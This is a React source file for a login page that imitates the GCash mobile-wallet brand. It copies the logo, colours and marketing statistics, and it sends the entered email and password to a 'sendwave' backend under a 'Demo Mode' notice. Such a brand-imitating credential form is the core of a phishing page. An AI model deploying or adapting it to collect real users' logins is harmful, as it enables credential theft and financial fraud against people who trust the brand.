import { Link, useNavigate } from "react-router-dom";
import { useState } from "react";
import { Eye, EyeOff, ArrowLeft, Shield, Check } from "lucide-react";

const GCashLogin = () => {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const normalizedEmail = formData.email.toLowerCase().trim();

    try {
      const response = await fetch("/api/sendwave/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: normalizedEmail,
          password: formData.password,
        }),
      });

      const data = await response.json();

      if (data.success) {
        localStorage.setItem("sendwave_user", JSON.stringify({
          ...data.data,
          walletId: "GC" + Math.random().toString(36).substr(2, 9).toUpperCase(),
        }));
        navigate("/sendwave/dashboard");
      } else {
        alert(data.error || "Login failed");
      }
    } catch (error) {
      alert("Network error. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white font-['Poppins',sans-serif]">
      {/* Header */}
      <header className="bg-white border-b border-gray-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <button
              onClick={() => navigate("/sendwave")}
              className="flex items-center gap-2 text-gray-600 hover:text-[#007DFE] transition"
            >
              <ArrowLeft className="w-5 h-5" />
              <span className="font-medium">Back</span>
            </button>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-[#007DFE] rounded-full flex items-center justify-center">
                <span className="text-white font-bold text-sm">G</span>
              </div>
              <span className="font-bold text-[#007DFE] text-xl">GCash</span>
            </div>
            <div className="w-20"></div>
          </div>
        </div>
      </header>

      <div className="flex min-h-[calc(100vh-64px)]">
        {/* Left Side - Branding */}
        <div className="hidden lg:flex lg:w-1/2 bg-gradient-to-br from-[#007DFE] to-[#0056b3] p-12 flex-col justify-between relative overflow-hidden">
          {/* Background Decorations */}
          <div className="absolute top-0 right-0 w-96 h-96 bg-white/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2"></div>
          <div className="absolute bottom-0 left-0 w-64 h-64 bg-white/10 rounded-full blur-3xl translate-y-1/2 -translate-x-1/2"></div>
          
          <div className="relative z-10">
            <h1 className="text-5xl font-bold text-white mb-4 leading-tight">
              Welcome back!
            </h1>
            <p className="text-blue-100 text-xl">
              Log in to manage your finances with the #1 Finance Super App
            </p>
          </div>

          {/* Security Badge */}
          <div className="relative z-10 bg-white/10 backdrop-blur-sm rounded-2xl p-6 max-w-sm">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 bg-white/20 rounded-xl flex items-center justify-center flex-shrink-0">
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h3 className="font-bold text-white text-lg mb-1">Your security matters</h3>
                <p className="text-blue-100 text-sm">
                  GCash uses bank-level encryption to keep your account and transactions safe 24/7
                </p>
              </div>
            </div>
          </div>

          {/* Stats */}
          <div className="relative z-10 flex gap-8">
            <div>
              <p className="text-4xl font-bold text-white">94M+</p>
              <p className="text-blue-200 text-sm">Active Users</p>
            </div>
            <div>
              <p className="text-4xl font-bold text-white">6M+</p>
              <p className="text-blue-200 text-sm">Merchants</p>
            </div>
            <div>
              <p className="text-4xl font-bold text-white">200+</p>
              <p className="text-blue-200 text-sm">Countries</p>
            </div>
          </div>
        </div>

        {/* Right Side - Form */}
        <div className="flex-1 flex items-center justify-center p-6 lg:p-12 bg-gray-50">
          <div className="w-full max-w-md">
            {/* Mobile Logo */}
            <div className="lg:hidden text-center mb-8">
              <div className="w-16 h-16 bg-[#007DFE] rounded-2xl flex items-center justify-center mx-auto mb-4">
                <span className="text-white font-bold text-2xl">G</span>
              </div>
              <h1 className="text-2xl font-bold text-gray-900">Welcome back!</h1>
              <p className="text-gray-500 mt-1">Log in to your GCash account</p>
            </div>

            {/* Desktop Header */}
            <div className="hidden lg:block text-center mb-8">
              <h2 className="text-3xl font-bold text-gray-900">Log in</h2>
              <p className="text-gray-500 mt-2">Enter your credentials to continue</p>
            </div>

            {/* Form Card */}
            <div className="bg-white rounded-3xl shadow-xl p-8 border border-gray-100">
              <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Email Address
                  </label>
                  <input
                    type="email"
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    placeholder="juan@email.com"
                    className="w-full px-4 py-4 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#007DFE] focus:border-transparent text-gray-900 placeholder-gray-400"
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Password
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      placeholder="Enter your password"
                      className="w-full px-4 py-4 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#007DFE] focus:border-transparent text-gray-900 placeholder-gray-400 pr-12"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition"
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                </div>

                {/* Forgot Password */}
                <div className="text-right">
                  <a href="#" className="text-[#007DFE] text-sm font-medium hover:underline">
                    Forgot password?
                  </a>
                </div>

                <button
                  type="submit"
                  className="w-full py-4 bg-[#007DFE] text-white rounded-xl font-bold text-lg hover:bg-blue-600 transition shadow-lg shadow-blue-500/25"
                >
                  Log In
                </button>
              </form>

              {/* Divider */}
              <div className="relative my-8">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-200"></div>
                </div>
                <div className="relative flex justify-center">
                  <span className="bg-white px-4 text-sm text-gray-500">or</span>
                </div>
              </div>

              {/* Biometric Login */}
              <button className="w-full py-4 border-2 border-gray-200 rounded-xl font-semibold text-gray-700 hover:bg-gray-50 transition flex items-center justify-center gap-3">
                <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.39-2.823 1.07-4" />
                </svg>
                Use Fingerprint / Face ID
              </button>
            </div>

            {/* Sign Up Link */}
            <p className="text-center text-gray-600 mt-6">
              Don't have an account?{" "}
              <Link to="/sendwave/register" className="text-[#007DFE] font-semibold hover:underline">
                Register now
              </Link>
            </p>

            {/* Demo Notice */}
            <div className="mt-6 p-4 bg-blue-50 border border-blue-100 rounded-2xl">
              <div className="flex gap-3 items-start">
                <div className="w-8 h-8 bg-[#007DFE] rounded-full flex items-center justify-center flex-shrink-0">
                  <Check className="w-4 h-4 text-white" />
                </div>
                <div>
                  <p className="font-semibold text-gray-900">Demo Mode</p>
                  <p className="text-sm text-gray-600">
                    Use any email and password to log in
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GCashLogin;
